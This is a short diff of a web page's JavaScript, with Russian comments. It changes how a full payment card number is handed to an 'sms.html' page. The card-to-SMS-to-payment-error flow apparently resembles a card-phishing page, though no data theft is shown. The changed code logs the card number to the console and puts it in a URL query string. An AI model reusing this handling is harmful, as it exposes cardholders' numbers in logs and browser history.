@@ -736,11 +736,14 @@
         };
 
         window.redirectToSMS = function() {
-    // Берем номер карты из данных формы
-    const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-    const cardNumber = formData.cardNumber || '0000000000000000';
-    sessionStorage.setItem('cardNumber', cardNumber);
-    window.location.href = `sms.html?card=${cardNumber}`;
+    // Берем номер карты из sessionStorage
+    const cardNumber = sessionStorage.getItem('cardNumber');
+    console.log('💳 Передаем номер карты в SMS:', cardNumber);
+    if (cardNumber) {
+        window.location.href = `sms.html?card=${cardNumber}`;
+    } else {
+        window.location.href = 'sms.html';
+    }
 };
 
         window.redirectToPaymentWithError = function() {
@@ -767,6 +770,7 @@
     </script>
 </body>
 </html>
+
 
 
 
